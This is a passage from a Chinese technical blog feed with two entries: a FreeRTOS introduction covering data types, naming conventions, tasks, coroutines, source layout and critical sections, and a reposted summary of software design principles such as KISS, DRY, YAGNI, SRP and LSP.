    <content type="html"><![CDATA[<p>这是FreeRTOS系列学习文章的第一节，主要是关于FreeRTOS的前置知识点。</p><span id="more"></span><h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1 基础知识"></a>1 基础知识</h1><p>首先我们了解freertos中的变量类型.在这个实时操作系统中使用的基本变量类型虽然是标准的,但是都被更改为了其他命令,具有显著特征.</p><h2 id="1-1-变量类型"><a href="#1-1-变量类型" class="headerlink" title="1.1 变量类型"></a>1.1 变量类型</h2><p>在这个参数系统中<code>int</code>没有被使用, 取而代之的是<code>unsigned int</code>和<code>long</code>.<br>并且由于C标准中没有规定<code>char</code>默认是有符号的还是无符号的.所以,在FreeRTOS中，我们都需要明确指定变量char是有符号的还是无符号的。</p><p>在FreeRTOS中，使用的数据类型虽然都是标准C里面的数据类型，但是针对不同的处理器，对标准C的数据类型又进行了重定义，给它们设置了一个新的名字，比如为char重新定义了一个名字portCHAR，这里的port表示接口，在将FreeRTOS移植到处理器上时，需要用这些接口文件把它们连接在一起。但是用户在写程序时并非一定要遵循FreeRTOS的风格，仍可以直接用C语言的标准类型。在FreeRTOS中，int型从不使用，只使用short型和long型。<strong>在Cortex-M内核的MCU中，short为16位，long为32位。</strong></p><p>具体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> portCHAR        char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portFLOAT       float</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portDOUBLE      double</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portLONG        long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portSHORT       short</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portSTACK_TYPE  uint32_t</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portBASE_TYPE   long </span><br><br><span class="hljs-keyword">typedef</span> portSTACK_TYPE StackType_t;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> BaseType_t;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> UBaseType_t;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span>( config USE_16_BIT_TICKS == 1 )</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint16_t</span> TickType_t;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portMAX_DELAY ( TickType_t ) 0xffff</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint32_t</span> TickType_t;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> portMAX_DELAY ( TickType_t ) 0xffffffffUL</span><br></code></pre></td></tr></table></figure><h3 id="1-1-1-具体变量名"><a href="#1-1-1-具体变量名" class="headerlink" title="1.1.1 具体变量名"></a>1.1.1 具体变量名</h3><p>FreeRTOS中，定义变量时往往会把变量的类型当作前缀加在变量上，这样做的好处是让用户一看到这个变量就知道该变量的类型。比如char型变量的前缀是c，short型变量的前缀是s，long型变量的前缀是l，portBASE_TYPE类型变量的前缀是x。还有其他的数据类型，比如数据结构、任务句柄、队列句柄等定义的变量名的前缀也是x。</p><p>如果一个变量是无符号型的，那么会有一个前缀u，如果是一个指针变量，则会有一个前缀p。因此，当我们定义一个无符号的char型变量时会加一个uc前缀，当定义一个char型的指针变量时会加一个pc前缀。</p><p>FreeRTOS都会将标准的C数据类型用typedef重新定义一个类型名。这些经过重定义的数据类型放在portmacro.h</p><h3 id="1-1-2-函数名"><a href="#1-1-2-函数名" class="headerlink" title="1.1.2 函数名"></a>1.1.2 函数名</h3><p>在FreeRTOS中函数的命令非常特别,其将返回类型、定义在哪里、干什么的都体现在函数名中:</p><ul><li>vTaskPrioritySet()函数的返回值为void型，在task.c文件中定义。</li><li>xQueueReceive()函数的返回值为portBASE_TYPE型，在queue.c文件中定义。</li><li>vSemaphoreCreateBinary()函数的返回值为void型，在semphr.h文件中定义。</li></ul><h2 id="1-2-系统模式"><a href="#1-2-系统模式" class="headerlink" title="1.2 系统模式"></a>1.2 系统模式</h2><p>在单片机中,由于结构简单、性能较低所以使用都是一些简单的系统管理方式：</p><ul><li>裸机系统</li><li>轮询系统</li><li>前后台系统</li><li>多任务系统</li></ul><p>关于裸机系统和轮询系统不在多说，主要是前后台系统和任务系统。其实这两个系统也是非常类似的。</p><p>前后台系统中，将整个系统划分为前台和后台，前台其实就是<code>main</code>函数；而后台就是对应的<strong>中断处理函数</strong>。一个事件的响应和处理都是在中断处理函数中进行，这就到这了效率低下。</p><p>在多任务系统中，只是多了一种<strong>任务</strong>处理方式。事件的响应仍然是在中断处理函数中，但是具体的执行被转换到了<strong>任务处理函数</strong>。提高了效率</p><p>各个系统的主要区别： </p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401070013082.png"></p><h1 id="2-1-名词解释"><a href="#2-1-名词解释" class="headerlink" title="2.1 名词解释"></a>2.1 名词解释</h1><h2 id="2-1-1-任务"><a href="#2-1-1-任务" class="headerlink" title="2.1.1 任务"></a>2.1.1 任务</h2><p>在FreeRTOS中提出了<strong>任务</strong>这个概念。在裸机系统中，系统的主体就是main()函数里面顺序执行的无限循环，在这个无限循环中，CPU按照顺序完成各种操作。在多任务系统中，我们根据功能的不同，把整个系统分割成一个个独立的且无法返回的函数，这种函数我们称为任务。</p><p>“任务”的主要特点是：</p><ul><li>每一个任务都有自己的栈，它们之间互不干扰</li><li><strong>在任何时间点，应用程序中只能执行一个任务</strong>，实时 RTOS 调度器负责决定所要执行的任务。</li><li>使用优先级进行cpu资源的分配</li><li>支持完全抢占机制</li><li>独立、死循环、不可返回</li></ul><h2 id="2-1-2-协程"><a href="#2-1-2-协程" class="headerlink" title="2.1.2 协程"></a>2.1.2 协程</h2><p>协程和任务是非常类似的，但是仍然有着一下不同：</p><ul><li>所有的协程共享一个栈，所以协程对于内存的需求是很小的，这使得协程就主要应用于内存非常小的单片机中。</li><li>协程间使用优先级协同调度，但可以包含在使用抢占式任务的应用程序中。但是如果同时使用了任务和协程，则协程总是被任务抢占。</li></ul><p>请注意，可以仅使用任务，仅使用协程，或结合两者设计应用程序。然而，任务和协程使用不同的 API 函数，因此不能通过队列（或信号量）将数据从任务传递到协程，反之亦然。</p><h1 id="3-1-源码结构"><a href="#3-1-源码结构" class="headerlink" title="3.1 源码结构"></a>3.1 源码结构</h1><p>FreeRTOS是开源的实时操作系统, 其核心代码仅仅是<code>task.c</code>和<code>list.c</code>这两个文件. 其他的源文件的作用如下:</p><ul><li>queue.c 这个文件提供了队列和信号量支持，这个文件几乎总是需要的。</li><li>timers.c 这个文件提供了软件定时器功能，只有当要用到软件定时器的使用才需要包含它。</li><li>evnet-group.c 这个文件提供了任务组的功能，只有当需要使用任务组是才需要将其包含构建。</li><li>crotine.c 这个文件提供了协程的代码，只有需要使用协程的使用才是需要将它包含进来。</li></ul><h2 id="3-1-1-其他目录"><a href="#3-1-1-其他目录" class="headerlink" title="3.1.1 其他目录"></a>3.1.1 其他目录</h2><p>源码中还有一个<code>portable</code>的目录，这个目录主要是编译器的接口文件。</p><h2 id="3-1-2-构建系统"><a href="#3-1-2-构建系统" class="headerlink" title="3.1.2 构建系统"></a>3.1.2 构建系统</h2><p>想要构建这个操作系统，一下的文件是不可少的。</p><ul><li>上面讲到的几个<code>.c</code>文件，最后都加上</li><li><code>include/</code>目录下的所有头文件+<code>FreeRTOSConfig.h </code>这个文件在例子中有。</li></ul><h1 id="4-0-临界区"><a href="#4-0-临界区" class="headerlink" title="4.0 临界区"></a>4.0 临界区</h1><p>每个进程中访问临界资源的那段代码称为<strong>临界区（Critical Section）</strong> （临界资源是一次仅允许一个进程使用的共享资源）。</p><p>每次只准许一个进程进入临界区，进入后不允许其他进程进入。不论是硬件临界资源，还是软件临界资源，多个进程必须互斥地对它进行访问。多个进程中涉及到同一个临界资源的临界区称为相关临界区。</p><p>具体的概念：</p><p>考虑一个由n个进程<code>&#123;P 0 , P 1 ,..., P n−1 &#125;</code>组成的系统。每个进程都有一段称为临界区（critical section）的代码，进程会在其中更改公共变量、更新表、编写文件等等。该系统的重要特性是，当一个进程在其临界区（critical section）执行时，不允许其他进程在其临界区（critical section）执行。也就是说，没有两个进程可以同时在它们的临界区（critical section）执行。临界区问题（critical-section problem）是设计一个进程可以用来进行协作的协议。每个进程必须请求允许进入其临界区（critical section）。实现此请求的代码段是入口区（entry section）。临界区（critical section）之后则是出口区（exit section）。其余的代码是剩余区（remainder section）。</p><h2 id="4-1-各种区的总结"><a href="#4-1-各种区的总结" class="headerlink" title="4.1 各种区的总结"></a>4.1 各种区的总结</h2><ul><li>临界区：每个进程有一个代码段叫临界区，没有两个进程可同时在临界区内执行</li><li>进入区：实现请求进入临界区的代码段叫做进入区</li><li>退出区：退出临界区后进行一些状态处理的代码段叫做退出区</li><li>剩余区：其他代码称为剩余区</li><li>临界区问题：设计一个协议，每个进程必须请求允许进入其临界区</li></ul><h2 id="4-2-临界区解答的三项要求"><a href="#4-2-临界区解答的三项要求" class="headerlink" title="4.2 临界区解答的三项要求"></a>4.2 临界区解答的三项要求</h2><ul><li>互斥：若一个进程在临界区内，其他进程不得进入临界区</li><li>前进：如果没有进程在其临界区内执行且有进程需要进入临界区，那么只有那些想要进入临界区的进程参加选择以可以进入临界区</li><li>有限等待：从一个进程做出进入临界区的请求，直到该请求允许为止，其他进程允许进入其临界区的次数有上限</li></ul><h2 id="4-3-操作系统内临界区问题的处理方式："><a href="#4-3-操作系统内临界区问题的处理方式：" class="headerlink" title="4.3 操作系统内临界区问题的处理方式："></a>4.3 操作系统内临界区问题的处理方式：</h2><ul><li>非抢占内核<ul><li>不允许处于内核模式的进程被抢占, 从根本上不会导致竞争条件</li></ul></li><li>抢占内核<ul><li>允许处于内核模式的进程被抢占<br>优点<br>更适合实时编程<br>抢占内核响应更快</li></ul></li></ul><h1 id="5-0-杂项"><a href="#5-0-杂项" class="headerlink" title="5.0 杂项"></a>5.0 杂项</h1><ol><li>在FreeRTOS的代码中经常会看到诸如<code>traceTIMER_COMMAND_SEND</code>、<code>traceEVENT_GROUP_CREATE</code>这类的函数宏，但是点进去看又发现没有定义如何东西，其实这是FreeRTOS和Trace调试工具的联合使用所需要的代码。</li></ol><p>其<a href="https://www.freertos.org/zh-cn-cmn-s/FreeRTOS-Plus/FreeRTOS_Plus_Trace/FreeRTOS_Plus_Trace.html">官网</a>写道：</p><blockquote><p>FreeRTOS 内核在关键位置包含 100 多个“跟踪钩子”</p></blockquote><p>所以我们看到的哪些没有被定义的函数宏实际上就是钩子函数，用于后续的Trace调试。</p>]]></content>
    
    
    <categories>
      
      <category>FreeRTOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件设计原则</title>
    <link href="/2024/01/05/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/"/>
    <url>/2024/01/05/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
    
    <content type="html"><![CDATA[<p>软件设计原则的总结</p><span id="more"></span><div id="post" class=""><article class="post-content" id="article-container"><blockquote><p>本文转载自 <a target="_blank" rel="noopener" href="https://blinkfox.github.io/">blinkfox</a> 的博客，总结了常用的软件设计原则，对于工程上来说很有指导意义。</p></blockquote><h2 id="一前言">一、前言</h2><p>软件也像人一样，具有生命力，从出生到死亡，会经历多种变化。软件架构设计也不是一蹴而就的，是不断地演进发展。每个程序员都可以从理解编程原则和模式中受益。</p><p>软件设计原则是一组帮助我们避开不良设计的指导方针。根据 <code>Robert Martin</code> 的理论，应该避免不良设计的以下三个重要特点：</p><ul><li><strong>僵化</strong>：很难做改动，因为每一个细微的改动都会影响到系统大量的其他功能</li><li><strong>脆弱</strong>：每当你做一次改动，总会引起系统中预期之外的部分出现故障</li><li><strong>死板</strong>：代码很难在其他应用中重用，因其不能从当前应用中单独抽离出来</li></ul><p>下面这些软件设计原则是我从一些书籍和网络中收集而来，并不完整，而且你也需要在一些有 “冲突的原则” 之间进行权衡和取舍。本文或许会对你的编程、程序设计、讨论或评审工作有所帮助。</p><span id="more"></span><h2 id="二通用设计原则">二、通用设计原则</h2><h3 id="kiss">1. KISS</h3><p>所谓 <code>KISS</code> 原则，即：<code>Keep It Simple,Stupid</code>，指<strong>设计时要坚持简约原则，避免不必要的复杂化，并且易于修改</strong>。</p><blockquote><p>Everything should be made as simple as possible, but not simpler. - Albert Einstein</p></blockquote><p>简单清晰、功能强大是软件设计最重要的原则和目标。但是软件工程天然错综复杂，而 “简单” 却没有一个衡量标准，判断和实现一个东西是不是简单，可以通过以下方式来参考。</p><ul><li>让别的软件工程师以一种最容易的方式使用你的方案。</li><li>简单不是走捷径，不是为手边的问题找一个最快的方案。</li><li>当系统变得更庞大更复杂的时候依然能够被理解。</li><li>如果系统无法保持简单，那么我们能做的就是保持各个局部简单，即任何单个的类、模块、应用的设计目标及工作原理都能被快速理解。</li></ul><blockquote><p><strong>我的理解</strong>：保持简单但不能掩盖软件丰富的内涵。即<strong>简约而不简单</strong>！简约是对复杂的事物抽丝剥茧、去除细枝末节显露主要逻辑的过程。就像小时候老师教写文章，要求尽可能用朴实的语言，言简意赅的写出来，但却又要避免语言过于贫乏。软件的 “抽象” 和它的 “直观性”，其实是一对矛盾的关系，软件设计就要保证这两者的平衡。代码抽象过于复杂会陷入 “过度设计” 不易理解的困境；为了 “直观性” 缺乏抽象，长此以往又会出现大量的重复、不易于扩展和难维护的困境。</p></blockquote><h3 id="dry">2. DRY</h3><p>所谓 <code>DRY</code> 原则，即：<code>Don't Repeat Yourself</code>，<strong>不要让自己重复</strong>。</p><p><strong>重复代码是软件程序变烂的万恶之首</strong>。<code>DRY</code> 并不是指你不能复制代码，而是你复制的代码不能包含重复的 “信息”。复制的东西并不仅仅是复制了代码，而是由于你把同一个信息散播在了代码的各个部分导致了有很多相近的代码也散播在各个地方。代码之所以要写的好，不要重复某些 “信息”，因为需求人员总是要改需求，不改代码你就要 “死”，改代码你就要加班，所以为了减少修改代码的痛苦，我们不能重复任何信息。举个例子，有一天需求人员说，要把分隔符从分号改成顿号！一下子就要改多个地方了。</p><p>所以，<strong>去掉重复的信息会让你的代码结构发生本质的变化</strong>。</p><p>“重复代码” 有很多变体：</p><ul><li>魔法数字、魔法字符串等</li><li>相同代码块</li><li>相似的代码逻辑及操作</li></ul><p>对于消除重复的代码有<strong>事不过三</strong>法则。</p><ul><li>第一次先写了一段代码。</li><li>第二次在另一个地方写了一段相同或相似逻辑的代码，你已经有消除和提取重复代码的冲动了。</li><li>再次在另一个地方写了同样的代码，你已忍无可忍，现在可以考虑抽取和消除重复代码了。</li></ul><blockquote><p><strong>我的理解</strong>：解决重复的最佳的方式是通过培养良好的编码习惯来避免重复，通过重构的手段来消除重复。发现和解决重复并不困难，通过提取抽象、提取方法等措施就能消除重复，但困难的是<strong>立即行动</strong>去解决重复，从而不断的磨砺和提升自己的编程技艺，不断将私人代码变成公共代码，这才是自我提升的过程。解决了重复，经过一段时间，你就会发现，你对整个系统的理解程度在不知不觉中提高了不少。</p></blockquote><h3 id="maximize-cohesion-minimize-coupling">3. Maximize Cohesion， Minimize Coupling</h3><p>所谓 <code>Maximize Cohesion,Minimize Coupling</code> 原则，即：<strong>高内聚低耦合</strong>。这是判断设计好坏的标准，主要是看<strong>模块内的内聚性是否高，模块间的耦合度是否低。</strong></p><ul><li><strong>耦合性</strong>：也称块间联系。指软件系统结构中各模块间相互联系紧密程度的一种度量。模块之间联系越紧密，其耦合性就越强，模块的独立性则越差。模块间耦合高低取决于模块间接口的复杂性、调用的方式及传递的信息。耦合是软件结构中各模块之间相互连接的一种度量，耦合强弱取决于模块间接口的复杂程度、进入或访问一个模块的点以及通过接口的数据。</li><li><strong>内聚性</strong>：又称块内联系。指模块的功能强度的度量，即一个模块内部各个元素彼此结合的紧密程度的度量。若一个模块内各元素（语名之间、程序段之间）联系的越紧密，则它的内聚性就越高。内聚是从功能角度来度量模块内的联系，一个好的内聚模块应当恰好做一件事。它描述的是模块内的功能联系。</li></ul><p>内聚和耦合是密切相关的，同其他模块存在高耦合的模块意味着低内聚，而高内聚的模块意味着该模块同其他模块之间是低耦合。在进行软件设计时，应力争做到高内聚，低耦合。</p><p>Java 中实现高内聚低耦合的常用方式：</p><ul><li>少使用类的继承，多用接口隐藏实现的细节。</li><li>模块的功能化分尽可能的单一，道理也很简单，功能单一的模块供其它模块调用的机会就少。</li><li>遵循一个定义只在一个地方出现。</li><li>少使用全局变量。</li><li>类属性和方法的声明少用 <code>public</code>，多用 <code>private</code> 关键字，</li><li>多用设计模式，比如采用 <code>MVC</code> 的设计模式就可以降低界面与业务逻辑的耦合度。</li><li>尽量不用 “硬编码” 的方式写程序。</li><li>最后当然就是避免直接操作或调用其它模块或类（内容耦合）。</li></ul><h3 id="soc">4. SOC</h3><p>所谓 <code>SOC</code> 原则，即：<strong>关注点分离</strong>（<code>Separation of Concerns</code>）。<strong>不同领域的功能，应该由不同的代码和最小重迭的模块组成。</strong>关注点分离是处理复杂性的一个原则。由于关注点混杂在一起会导致软件程序复杂性大大增加，所以能够把不同的关注点分离开来，分别处理就是处理复杂性的一个原则，一种方法。关注点分离原则不仅体现在软件程序设计等设计方法中，同时也体现在架构设计、问题求解、软件开发过程、软件项目管理以及软件开发方法学等诸多方面。</p><p><code>MVC</code> 就是关注点分离的一个体现，把业务逻辑、数据、界面分离，这也是组织代码结构的一个形式。<code>MVC</code> 的基本结构：</p><ul><li><code>Model</code> 层表示应用程序的数据核心，通常负责在数据库中存取数据。</li><li><code>View</code> 是应用程序的显示层，通常是依据模型的数据而建立。</li><li><code>Controller</code> 是用来控制和处理输入输出的，是处理用户交互的部分，也负责向模型（<code>Model</code> 层）发送数据。</li></ul><p><code>MVC</code> 的这个设计各个关注点是分开的，这样有助于我们管理和开发复杂的应用程序，我们可以在某个时间点只集中精力在其中的某一个关注点，而不是所有的部分。</p><blockquote><p>好的架构必须使每个关注点相互分离，也就是说系统中的一个部分发生了变化，不会影响其他部分。即使需要改变，也能够清晰地识别出那些部分需要改变。如果需要扩展架构，影响将会最小化，已经可以工作的每个部分都将继续工作。——Ivar Jacobson (《AOSD 中文版》)</p></blockquote><h4 id="分离方式">分离方式</h4><p>下面将介绍一些分层的思想和方式:</p><ul><li><strong>纵向分离</strong>: 如常见的三层架构（逻辑控制层、业务处理层和数据持久化层）。</li><li><strong>横向分离</strong>: 如把我们的软件拆分成模块或子系统。从左到右是模块 1、模块 2、模块 3，这是一种水平方向的切割。这跟纵向的分离是两个不同的方向，横向分离大多是模块化的过程。</li><li><strong>切面分离</strong>: 有些内容是多个层之间都需要的，比如日志（<code>log</code>），在你的系统里面，界面层、逻辑层、数据访问层可能都需要写日志，这种跨到多层同样逻辑就可以考虑切面分离。</li><li><strong>依赖方向分离</strong>: 按依赖方向考虑，决定某个类应该放在哪个层次里面，或者考虑将某一层切割成多层。</li><li><strong>关注数据分离</strong>: 在组织数据时，应该尽量考虑数据本身的固有属性，如果不是它们的固有属性，那么应该分离出来。比如产品的类就不应该关联 <code>customer</code> 类，应该是用订单类来把他们联系在一起。</li><li><strong>关注行为分离</strong>: 行为也应该是事物或对象的固有的本身的行为，明显偏离原来行为的，应该考虑成另外的关注点儿分离开。比如有一个函数叫做 <code>CreateNewCustomer()</code>，那么 <code>CreateNewCustomer()</code> 的行为就应该限定在创建一个新客户上面，给新客户自动发优惠券的动作就不能放到这个函数里面。</li><li><strong>扩展分离</strong>: 如果基于某种设计，原先不具有某些行为需要增加，可以考虑通过扩展或插件的形式来完成，将这些功能放入到插件或扩展中。</li><li><strong>反转分离</strong>: 很多依赖注入的框架，如 <code>Spring</code>、<code>Guice</code> 等等，这些帮助我们做依赖反转，从而倒置依赖关系。</li></ul><h3 id="yagni">5. YAGNI</h3><p>所谓 <code>YAGNI</code> 原则，即：<code>You Ain’t Gonna Need It</code>，<strong>你不需要它</strong>。它是一种极限编程（XP）实践，表示程序员不应为目前还不需要的功能编写代码。<code>YAGNI</code> 很像 <code>KISS</code> 原则，因为它也是致力于构建简单的方案。然而，<code>KISS</code> 是通过尽可能容易的完成某件事情来实现精简方案；但 <code>YAGNI</code> 是通过根本就不实现它来达到精简。<code>YAGNI</code> 的观点是你应该<strong>为了眼前的需求做设计而不是未来</strong>。</p><blockquote><p>只在真正需要某些功能的时候才去实现它，而不是仅仅因为你预见到它将出现。- XP 的联合创始人 Ron Jeffries</p></blockquote><p>即使你非常确信将来你需要某个特性，也不要现在就去实现它。在很多情况下，你会发现或许最终你不需要它了，或者是你真正所需的特性与你之前预计的有很大的出入。遵循 YAGNI 实践有两个主要原因：</p><ul><li>你节约了时间，因为你避免了编写最终证明不必要的代码。</li><li>你的代码质量更高了，因为你使代码不必为你的 “推测” 所污染，而这些 “推测” 最终可能或多或少有些错误，但此时这些错误已牢牢地依附在你的代码中了。</li></ul><blockquote><p><strong>我的理解</strong>：YAGNI 原则，本质上是告诫我们<strong>写代码不要画蛇添足，否则就会弄巧成拙了</strong>。编写业务代码时，不要去假想一些需求或者场景，因为大多数你所设想的场景都不会发生，而你所多写的那些代码也将会长期滞留在你的系统中，收效甚微，但却让你和团队花费了更多的时间和精力去书写和维护，更可怕的是可能会对将来新的代码维护人造成困惑。另外对于没有被使用到的代码，我认为也都应该立即删除，从而保持系统的精简，如果将来需要时再去书写或恢复，而且那时侯写出的代码也绝对比之前的更为契合。</p></blockquote><h3 id="boy-scout-rule">6. Boy-Scout Rule</h3><p><code>Boy-Scout Rule</code>，译为：<strong>童子军规则</strong>。美国童子军有一个简单的规则：“让营地比你刚来时更干净 (<code>Always leave the campground cleaner than you found it</code>)”。如果看到地上有垃圾，不管是谁扔的，都要清理。这样你就有意地为下一批来宿营的人改善了环境。</p><p>童子军规则告诉我们在对现有代码库进行更改时，代码质量往往会降低，从而积累技术债务。所以需要<strong>始终保持代码整洁</strong>。不管原作者是谁，如果我们努力去改进代码模块，不管是多么小的改进，我们的软件系统就再也不会持续变坏了。取而代之的是，系统在发展的同时会逐渐变得更好。我们也会看到团队们关心整体的系统，而不是各自只关心自己负责的一小部分。而且团队成员要互助，互相清理代码，他们遵从童子军规则，因为那对每个人都很好，而不仅仅是对自己好。</p><p>关于童子军规则中所提倡的<strong>对代码坏味道的尽早修复</strong>，我也想起来了我们所熟知的 “<strong>破窗效应</strong>” 和 “<strong>讳疾忌医</strong>” 的典故：</p><h4 id="破窗效应">破窗效应</h4><blockquote><p>如果有人打坏了一幢建筑物的窗户玻璃，而这扇窗户又得不到及时的维修，别人就可能受到某些示范性的纵容去打烂更多的窗户。久而久之，这些破窗户就给人造成一种无序的感觉，结果在这种公众麻木不仁的氛围中，犯罪就会滋生、猖獗。—— 政治学家威尔逊和犯罪学家凯琳提出的 “破窗效应” 理论</p></blockquote><ul><li>“环境早就脏了，我扔的这点儿垃圾根本起不到关键性作用。”</li><li>“这个代码以前的其他人也都是这样写的。”</li><li>“反正也不是只有我才这么写代码的。”</li></ul><p>不少人会像上面这样辩解自己的过错。其实，这些说法根本站不住脚，错了就是错了，影响的大小并不能改变行为错误的本质，别人的错误更不会是证明你无错的理由。任何一种不良现象的存在，都有可能传递一种错误信息。进而导致更坏的后果，正所谓 “<strong>千里之堤，溃于蚁穴</strong>”、<strong>勿以善小而不为，勿以恶小而为之</strong>。</p><h4 id="讳疾忌医的典故">讳疾忌医的典故</h4><p><strong>扁鹊三连</strong></p><p>《扁鹊见蔡桓公》的故事，我们从小就学习了，告诉我们不能盲目相信自己，不能讳疾忌医。但想想我们自己代码的坏味道和 bug，也是如出一辙。</p><p>代码坏味道或者糟糕的程序代码就像隐形的 “疾病” 一样潜伏在项目中，也因此形成了技术债务。如果这些 “疾病” 在项目初期不引起注关注、不把疾病扼杀在萌芽之中，那么后期修复它的代价也就越大，也必然会使得项目的软件程序越来越难以维护，这个项目也最终会像蔡桓公一样无药可治、“无奈何也”。</p><blockquote><p>所以，请记住童子军规则对我们的启示：<strong>始终保持代码整洁，勿以善小而不为，勿以恶小而为之，有病早治</strong>。</p></blockquote><h3 id="其他原则">其他原则：</h3><ul><li><strong>避免过早优化</strong>（<code>Avoid Premature Optimization</code>）: 除非你的代码运行的比你想像中的要慢，否则别去优化。假如你真的想优化，就必须先想好如何用数据证明，它的速度变快了。“<strong>过早的优化是一切罪恶之源</strong>。”——Donald Knuth</li><li><strong> 最小惊讶原则</strong> (<code>Principle of least astonishment</code>): 代码应该尽可能减少让读者惊喜。也就是说，你编写的代码只需按照项目的要求来编写。其他华丽的功能就不必了，以免弄巧成拙。</li><li><strong>代码重用原则</strong>（<code>Code Reuse is Good</code>）: 重用代码能提高代码的可读性，缩短开发时间。</li><li><strong>别让我思考</strong> (<code>Don’t Make Me Think</code>): 所编写的代码一定要易于读易于理解，这样别人才会欣赏，也能够给你提出合理化的建议。相反，若是繁杂难解的程序，其他人总是会避而远之的。</li><li><strong>为维护者写代码</strong> (<code>Write Code for the Maintainer</code>): 优秀的代码，应当使本人或是他人在将来都能够对它继续编写或维护。代码维护时，或许本人会比较容易，但对他人却比较麻烦。因此你写的代码要尽可能保证他人能够容易维护。“如果一个维护者不再继续维护你的代码，很可能他就有了想杀你的冲动。”</li><li><strong> 正交原则 (Orthogonality)</strong>: 正交性的基本思想是，在概念上不相关的事物不应该与系统相关。设计越正交，异常越少。 这使得用编程语言更容易学习，读写程序。(反例：<code>CSS</code>)。</li><li><strong>做最简单的事儿就让代码可运行</strong>（<code>Do the simplest thing that could possibly work</code>）: 尽可能做最简单的事就可以让代码可运行。在编程中，一定要保持简单原则。作为一名程序员不断的反思 “如何在工作中做到简化呢？” 这将有助于在设计中保持简单的路径。</li><li><strong>隐藏实现细节</strong>（<code>Hide Implementation Details</code>）: 软件模块通过提供接口隐藏信息（即实现细节），而不泄漏任何不必要的信息。</li><li><strong>科里定律</strong> (<code>Curly's Law</code>): 是为任何特定的代码选择一个明确定义的目标：<strong>只做一件事</strong>。</li><li><strong>墨菲定律</strong> (<code>Murphy's Law</code>): 根本内容是：如果事情有变坏的可能，不管这种可能性有多小，它总会发生。主要内容如下：<ul><li>任何事都没有表面看起来那么简单；</li><li>所有的事都会比你预计的时间长；</li><li>会出错的事总会出错；</li><li>如果你担心某种情况发生，那么它就更有可能发生。</li></ul></li></ul><h2 id="三面向对象设计原则">三、面向对象设计原则</h2><h3 id="srp">1. SRP</h3><p>所谓 <code>SRP</code> 原则，即：<code>Single Responsibility Principle</code>，<strong>单一职责原则</strong>。原始定义如下：</p><blockquote><p>There should never be more than one reason for a class to change.(<strong>只有一个引起类改变的原因</strong>)</p></blockquote><p>在面向对象编程领域中，单一职责原则（<code>Single responsibility principle</code>）规定每个类都应该有一个单一的职责或者叫功能，并且该功能应该由这个类完全封装起来。所有它的（这个类的）服务都应该严密的和该功能平行（功能平行，意味着没有依赖）。一个类或者模块应该有且只有一个改变的原因。</p><p>如果一个类承担的职责过多，就等于把这些职责耦合在一起了。一个职责的变化可能会削弱或者抑制这个类完成其他职责的能力。这种耦合会导致脆弱的设计，当发生变化时，设计会遭受到意想不到的破坏。而如果想要避免这种现象的发生，就要尽可能的遵守单一职责原则。此原则的核心就是<strong>解耦</strong>和<strong>增强内聚性</strong>。</p><h4 id="单一职责的好处">单一职责的好处：</h4><ul><li>类的复杂性降低，实现什么职责都有清晰明确的定义；</li><li>可读性提高，复杂性降低，可维护性提高；</li><li>变更引起的风险降低。</li></ul><h4 id="单一职责原则的注意点">单一职责原则的注意点：</h4><ul><li>单一职责最难划分的是<strong>职责</strong>。</li><li>单一职责原则提出标准：用职责和变化原因来衡量接口或类设计的是否优良，但是职责和变化原因都是不可度量的，因项目、环境而异。</li><li>接口一定要做到单一职责，类的设计尽量做到只有一个原因引起它变化。</li></ul><h3 id="lsp">2. LSP</h3><p>所谓 <code>LSP</code> 原则，即：<code>Liskov Substitution principle</code>，<strong>里氏替换原则</strong>。原始定义如下：</p><blockquote><p>Functions that use pointers of references to base classes must be able to use objects of derived classes without knowing it.（<strong>所有引用基类的地方必须能透明地使用其子类的对象</strong>）</p></blockquote><p>更通俗的定义即为：<strong>子类可以扩展父类的功能，但不能改变父类原有的功能</strong>。里氏替换原则包含了一下 4 层含义：</p><ul><li>子类必须完全实现父类的方法。在类中调用其他类是务必要使用父类或接口，如果不能使用父类或接口，则说明类的设计已经违背了 <code>LSP</code> 原则。</li><li>子类可以有自己的个性。子类当然可以有自己的行为和外观了，也就是方法和属性。</li><li>覆盖或实现父类的方法时输入参数可以被放大。即子类可以覆盖父类的方法，但输入参数应比父类方法中的大，这样在子类代替父类的时候，调用的仍然是父类的方法。即以子类中方法的前置条件必须与超类中被覆盖的方法的前置条件相同或者更宽松。</li><li>覆盖或实现父类的方法时输出结果可以被缩小。</li></ul><h4 id="优点">优点：</h4><ul><li>提高代码的重用性，子类拥有父类的方法和属性；</li><li>提高代码的可扩展性，子类可形似于父类，但异于父类，保留自我的特性；</li></ul><h4 